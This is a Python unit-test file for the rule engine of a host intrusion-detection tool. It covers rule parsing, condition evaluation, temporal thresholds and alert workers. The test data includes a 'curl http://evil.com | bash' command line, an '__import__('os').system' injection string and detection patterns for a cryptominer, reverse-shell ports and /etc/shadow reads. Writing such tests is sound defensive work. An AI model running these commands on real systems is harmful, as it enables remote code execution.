"""Unit tests for the Rule Engine — Phase 3 (M22)."""

from __future__ import annotations

import asyncio
import time
import uuid
from pathlib import Path

import pytest

from oseye.core.schema import UniversalEvent
from oseye.rule_engine.evaluator import _eval_expr, evaluate
from oseye.rule_engine.models import RuleDefinition
from oseye.rule_engine.parser import load_all_rules, load_rules_from_file


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_RULES_ROOT = Path(__file__).parent.parent.parent.parent / "rules"


def _rule(
    condition: str,
    *,
    rule_id: str = "test_rule",
    severity: str = "medium",
    timeframe: int | None = None,
    threshold: int | None = None,
    platforms: list[str] | None = None,
    categories: list[str] | None = None,
) -> RuleDefinition:
    return RuleDefinition(
        id=rule_id,
        name="Test Rule",
        enabled=True,
        severity=severity,
        condition=condition,
        timeframe=timeframe,
        threshold=threshold,
        actions=["ALERT"],
        tags=[],
        mitre=[],
        platforms=platforms or [],
        categories=categories or [],
        explanation="test",
        source="custom",
    )


def _event(**kwargs: object) -> UniversalEvent:
    defaults: dict[str, object] = {
        "event_id": uuid.uuid4(),
        "timestamp_ns": time.time_ns(),
        "hostname": "test-host",
        "agent_id": uuid.uuid4(),
        "category": "process",
        "type": "exec",
        "severity": "info",
        "collector": "procfs",
        "hash_chain": "a" * 64,
    }
    defaults.update(kwargs)
    return UniversalEvent.model_validate(defaults)


# ---------------------------------------------------------------------------
# Parser tests
# ---------------------------------------------------------------------------

class TestParser:
    def test_load_builtin_rules(self) -> None:
        """All builtin rules load without error."""
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        rules = load_all_rules(_RULES_ROOT)
        assert len(rules) >= 25, f"Expected >=25 rules, got {len(rules)}"

    def test_rule_ids_unique(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        rules = load_all_rules(_RULES_ROOT)
        ids = [r.id for r in rules]
        assert len(ids) == len(set(ids)), "Duplicate rule IDs found"

    def test_all_rules_have_condition(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        rules = load_all_rules(_RULES_ROOT)
        for r in rules:
            assert r.condition.strip(), f"Rule {r.id} has empty condition"

    def test_load_invalid_file(self, tmp_path: Path) -> None:
        bad = tmp_path / "bad.yaml"
        bad.write_text("not: valid: yaml: :::")
        rules = load_rules_from_file(bad, "custom")
        assert rules == []

    def test_load_missing_condition(self, tmp_path: Path) -> None:
        f = tmp_path / "r.yaml"
        f.write_text("id: test\nname: test\nenabled: true\nseverity: medium\n")
        rules = load_rules_from_file(f, "custom")
        assert rules == []

    def test_custom_overrides_builtin(self, tmp_path: Path) -> None:
        builtin_dir = tmp_path / "builtin"
        custom_dir = tmp_path / "custom"
        builtin_dir.mkdir()
        custom_dir.mkdir()
        (builtin_dir / "r.yaml").write_text(
            "id: rule_x\nname: Builtin\nenabled: true\nseverity: low\n"
            "condition: event.category == 'process'\nactions: [ALERT]\n"
        )
        (custom_dir / "r.yaml").write_text(
            "id: rule_x\nname: Custom Override\nenabled: true\nseverity: critical\n"
            "condition: event.category == 'file'\nactions: [ALERT]\n"
        )
        rules = load_all_rules(tmp_path)
        assert len(rules) == 1
        assert rules[0].severity == "critical"
        assert rules[0].source == "custom"


# ---------------------------------------------------------------------------
# Evaluator — expression tests
# ---------------------------------------------------------------------------

class TestEvaluator:
    def test_simple_equality(self) -> None:
        ev = _event(category="file")
        rule = _rule("event.category == 'file'")
        assert evaluate(rule, ev) is True

    def test_simple_inequality(self) -> None:
        ev = _event(category="process")
        rule = _rule("event.category == 'file'")
        assert evaluate(rule, ev) is False

    def test_boolean_and(self) -> None:
        ev = _event(category="file", type="read", uid=1000)
        rule = _rule("event.category == 'file' and event.type == 'read' and event.uid != 0")
        assert evaluate(rule, ev) is True

    def test_boolean_or(self) -> None:
        ev = _event(resource="/etc/passwd")
        rule = _rule("event.resource == '/etc/shadow' or event.resource == '/etc/passwd'")
        assert evaluate(rule, ev) is True

    def test_multiline_condition(self) -> None:
        ev = _event(category="file", type="write", resource="/etc/cron.d/test")
        rule = _rule(
            "event.category == 'file'\n"
            "and event.type == 'write'\n"
            "and event.resource contains '/etc/cron'"
        )
        assert evaluate(rule, ev) is True

    def test_contains_keyword(self) -> None:
        ev = _event(cmdline="curl http://evil.com | bash")
        rule = _rule("event.cmdline contains 'bash'")
        assert evaluate(rule, ev) is True

    def test_contains_negative(self) -> None:
        ev = _event(cmdline="ls -la")
        rule = _rule("event.cmdline contains 'xmrig'")
        assert evaluate(rule, ev) is False

    def test_in_operator(self) -> None:
        ev = _event(dst_port=4444)
        rule = _rule("event.dst_port in [4444, 1337, 6666]")
        assert evaluate(rule, ev) is True

    def test_not_in_operator(self) -> None:
        ev = _event(dst_port=80)
        rule = _rule("event.dst_port not in [4444, 1337]")
        assert evaluate(rule, ev) is True

    def test_platform_filter_match(self) -> None:
        ev = _event(os="linux", category="process")
        rule = _rule("event.category == 'process'", platforms=["linux"])
        assert evaluate(rule, ev) is True

    def test_platform_filter_miss(self) -> None:
        ev = _event(os="windows", category="process")
        rule = _rule("event.category == 'process'", platforms=["linux"])
        assert evaluate(rule, ev) is False

    def test_none_attribute_safe(self) -> None:
        ev = _event()  # dst_port not set → None
        rule = _rule("event.dst_port == 22")
        assert evaluate(rule, ev) is False

    def test_disallowed_ast_node(self) -> None:
        ev = _event(category="process")
        rule = _rule("__import__('os').system('whoami')")
        # Should not raise — evaluator catches errors and returns False
        assert evaluate(rule, ev) is False

    def test_syntax_error_returns_false(self) -> None:
        ev = _event()
        rule = _rule("this is not valid python !!!")
        assert evaluate(rule, ev) is False

    def test_re_match(self) -> None:
        ev = _event(executable="/usr/bin/python3.11")
        rule = _rule("re_match(r'/usr/bin/python', event.executable)")
        assert evaluate(rule, ev) is True

    def test_numeric_comparison(self) -> None:
        ev = _event(uid=0)
        rule = _rule("event.uid == 0")
        assert evaluate(rule, ev) is True

    def test_gt_comparison(self) -> None:
        ev = _event(uid=1000)
        rule = _rule("event.uid > 0")
        assert evaluate(rule, ev) is True


# ---------------------------------------------------------------------------
# Temporal rules
# ---------------------------------------------------------------------------

class TestTemporalRules:
    def test_temporal_threshold_not_reached(self) -> None:
        rule = _rule(
            "event.category == 'network' and event.dst_port == 22 and event.result == 'denied'",
            rule_id="test_temporal_a",
            timeframe=60,
            threshold=5,
        )
        ev = _event(category="network", dst_port=22, result="denied")
        # Only 3 matching events — threshold is 5
        for _ in range(3):
            result = evaluate(rule, ev)
        assert result is False

    def test_temporal_threshold_reached(self) -> None:
        rule = _rule(
            "event.category == 'network' and event.dst_port == 22 and event.result == 'denied'",
            rule_id="test_temporal_b",
            timeframe=60,
            threshold=3,
        )
        ev = _event(category="network", dst_port=22, result="denied")
        results = [evaluate(rule, ev) for _ in range(3)]
        assert results[-1] is True


# ---------------------------------------------------------------------------
# RuleEngine integration
# ---------------------------------------------------------------------------

class TestRuleEngine:
    def test_engine_loads_builtin_rules(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        from oseye.rule_engine.engine import RuleEngine
        engine = RuleEngine(rules_root=_RULES_ROOT, hot_reload=False)
        assert engine.rule_count >= 25
        assert engine.enabled_count >= 25

    def test_engine_evaluate_shadow_read(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        from oseye.rule_engine.engine import RuleEngine
        engine = RuleEngine(rules_root=_RULES_ROOT, hot_reload=False)
        ev = _event(category="file", type="open", resource="/etc/shadow", uid=1000, os="linux")
        matches = engine.evaluate(ev)
        rule_ids = [m.rule_id for m in matches]
        assert "rule_shadow_read" in rule_ids

    def test_engine_no_match_clean_event(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        from oseye.rule_engine.engine import RuleEngine
        engine = RuleEngine(rules_root=_RULES_ROOT, hot_reload=False)
        ev = _event(category="process", type="exec", executable="/bin/ls", uid=1000)
        matches = engine.evaluate(ev)
        assert len(matches) == 0

    def test_engine_reload(self, tmp_path: Path) -> None:
        from oseye.rule_engine.engine import RuleEngine
        builtin_dir = tmp_path / "builtin"
        builtin_dir.mkdir()
        (builtin_dir / "r.yaml").write_text(
            "id: rule_tmp\nname: Tmp\nenabled: true\nseverity: low\n"
            "condition: event.category == 'file'\nactions: [ALERT]\n"
        )
        engine = RuleEngine(rules_root=tmp_path, hot_reload=False)
        assert engine.rule_count == 1
        (builtin_dir / "r2.yaml").write_text(
            "id: rule_tmp2\nname: Tmp2\nenabled: true\nseverity: high\n"
            "condition: event.category == 'network'\nactions: [ALERT]\n"
        )
        count = engine.reload()
        assert count == 2

    def test_engine_get_rule(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        from oseye.rule_engine.engine import RuleEngine
        engine = RuleEngine(rules_root=_RULES_ROOT, hot_reload=False)
        rule = engine.get_rule("rule_shadow_read")
        assert rule is not None
        assert rule.severity == "critical"

    @pytest.mark.asyncio
    async def test_engine_hot_reload_start_stop(self, tmp_path: Path) -> None:
        from oseye.rule_engine.engine import RuleEngine
        (tmp_path / "builtin").mkdir()
        engine = RuleEngine(rules_root=tmp_path, hot_reload=True, reload_interval=0.05)
        await engine.start_hot_reload()
        await asyncio.sleep(0.1)
        await engine.stop()

    # --- correction 2 : index de dispatch par catégorie ---

    def test_engine_category_index_only_evaluates_relevant_rules(self, tmp_path: Path) -> None:
        from oseye.rule_engine.engine import RuleEngine
        builtin = tmp_path / "builtin"
        builtin.mkdir()
        # Règle scoped "network" uniquement
        (builtin / "net.yaml").write_text(
            "id: net_rule\nname: Net\nenabled: true\nseverity: medium\n"
            "condition: event.dst_port == 4444\ncategories: [network]\nactions: [ALERT]\n"
        )
        # Règle sans filtre catégorie (tous les events)
        (builtin / "all.yaml").write_text(
            "id: all_rule\nname: All\nenabled: true\nseverity: low\n"
            "condition: event.uid == 0\nactions: [ALERT]\n"
        )
        engine = RuleEngine(rules_root=tmp_path, hot_reload=False)

        # Un event "process" ne doit matcher que all_rule (pas net_rule)
        ev_process = _event(category="process", uid=0, dst_port=4444)
        matches = engine.evaluate(ev_process)
        rule_ids = {m.rule_id for m in matches}
        assert "all_rule" in rule_ids
        assert "net_rule" not in rule_ids

        # Un event "network" peut matcher les deux
        ev_network = _event(category="network", uid=0, dst_port=4444)
        matches_net = engine.evaluate(ev_network)
        rule_ids_net = {m.rule_id for m in matches_net}
        assert "net_rule" in rule_ids_net
        assert "all_rule" in rule_ids_net

    # --- correction 3 : persistance des fenêtres temporelles ---

    def test_temporal_state_save_and_load(self, tmp_path: Path) -> None:
        import tempfile, os
        from oseye.rule_engine.engine import RuleEngine
        from oseye.rule_engine import evaluator as ev_mod

        builtin = tmp_path / "builtin"
        builtin.mkdir()
        engine = RuleEngine(rules_root=tmp_path, hot_reload=False)

        # Inject a fake temporal window entry
        with ev_mod._temporal_windows_lock:
            from collections import deque
            ev_mod._temporal_windows["fake::key"] = deque([(time.time(), {"hostname": "h"})])

        with tempfile.NamedTemporaryFile(delete=False, suffix=".pkl") as f:
            path = f.name
        try:
            engine.save_temporal_state(path)
            # Clear windows
            with ev_mod._temporal_windows_lock:
                ev_mod._temporal_windows.clear()
            engine.load_temporal_state(path)
            with ev_mod._temporal_windows_lock:
                assert "fake::key" in ev_mod._temporal_windows
        finally:
            os.unlink(path)
            with ev_mod._temporal_windows_lock:
                ev_mod._temporal_windows.pop("fake::key", None)

    def test_load_temporal_state_missing_file_is_noop(self, tmp_path: Path) -> None:
        from oseye.rule_engine.engine import RuleEngine
        (tmp_path / "builtin").mkdir()
        engine = RuleEngine(rules_root=tmp_path, hot_reload=False)
        # Should not raise
        engine.load_temporal_state(tmp_path / "nonexistent.pkl")

    # --- correction 4 : entity_key stable ---

    def test_stable_entity_key_uses_session_id(self) -> None:
        from oseye.rule_engine.engine import _stable_entity_key
        ev = _event(hostname="h", pid=100, ppid=1, session_id=999)
        assert _stable_entity_key(ev) == "h:999:100"

    def test_stable_entity_key_falls_back_to_ppid(self) -> None:
        from oseye.rule_engine.engine import _stable_entity_key
        ev = _event(hostname="h", pid=100, ppid=5)
        # session_id defaults to None in _event() helper
        assert _stable_entity_key(ev) == "h:5:100"

    def test_different_ppids_produce_different_keys(self) -> None:
        from oseye.rule_engine.engine import _stable_entity_key
        ev1 = _event(hostname="h", pid=100, ppid=1)
        ev2 = _event(hostname="h", pid=100, ppid=2)
        assert _stable_entity_key(ev1) != _stable_entity_key(ev2)


# ---------------------------------------------------------------------------
# RuleWorker integration
# ---------------------------------------------------------------------------

class TestRuleWorker:
    @pytest.mark.asyncio
    async def test_worker_publishes_match(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        from oseye.bus.memory_bus import InMemoryEventBus
        from oseye.workers.rule_worker import RuleWorker

        bus = InMemoryEventBus()
        published: list[bytes] = []

        class _FakeAlertRepo:
            async def create(self, alert: object) -> object:
                return alert

        worker = RuleWorker(
            bus=bus,
            alert_repo=_FakeAlertRepo(),  # type: ignore[arg-type]
            rules_root=_RULES_ROOT,
            hot_reload=False,
        )
        stop = asyncio.Event()
        task = asyncio.create_task(worker.run(stop_event=stop))
        await asyncio.sleep(0.05)

        # Publish a shadow read event
        ev = _event(category="file", type="open", resource="/etc/shadow", uid=1000, os="linux")
        await bus.publish("events:normalized", ev.model_dump_json().encode())
        await asyncio.sleep(0.1)

        stop.set()
        task.cancel()
        try:
            await task
        except (asyncio.CancelledError, Exception):
            pass

        assert worker._total_matches >= 1

    @pytest.mark.asyncio
    async def test_worker_creates_alert(self) -> None:
        if not _RULES_ROOT.exists():
            pytest.skip("rules root not found")
        from oseye.bus.memory_bus import InMemoryEventBus
        from oseye.core.schema import Alert
        from oseye.workers.rule_worker import RuleWorker

        bus = InMemoryEventBus()
        alerts_created: list[Alert] = []

        class _FakeAlertRepo:
            async def create(self, alert: Alert) -> Alert:
                alerts_created.append(alert)
                return alert

        worker = RuleWorker(
            bus=bus,
            alert_repo=_FakeAlertRepo(),  # type: ignore[arg-type]
            rules_root=_RULES_ROOT,
            hot_reload=False,
        )
        stop = asyncio.Event()
        task = asyncio.create_task(worker.run(stop_event=stop))
        await asyncio.sleep(0.05)

        ev = _event(
            category="file", type="modify",
            resource="/etc/passwd", uid=1000, os="linux",
        )
        await bus.publish("events:normalized", ev.model_dump_json().encode())
        await asyncio.sleep(0.1)

        stop.set()
        task.cancel()
        try:
            await task
        except (asyncio.CancelledError, Exception):
            pass

        assert len(alerts_created) >= 1
        assert alerts_created[0].rule_id == "rule_passwd_write"

    @pytest.mark.asyncio
    async def test_worker_skips_malformed_event(self) -> None:
        from oseye.bus.memory_bus import InMemoryEventBus
        from oseye.workers.rule_worker import RuleWorker

        bus = InMemoryEventBus()

        class _FakeAlertRepo:
            async def create(self, alert: object) -> object:
                return alert

        worker = RuleWorker(
            bus=bus,
            alert_repo=_FakeAlertRepo(),  # type: ignore[arg-type]
            hot_reload=False,
        )
        stop = asyncio.Event()
        task = asyncio.create_task(worker.run(stop_event=stop))
        await asyncio.sleep(0.05)

        await bus.publish("events:normalized", b"not valid json")
        await asyncio.sleep(0.05)

        stop.set()
        task.cancel()
        try:
            await task
        except (asyncio.CancelledError, Exception):
            pass

        assert worker._total_evaluated == 0
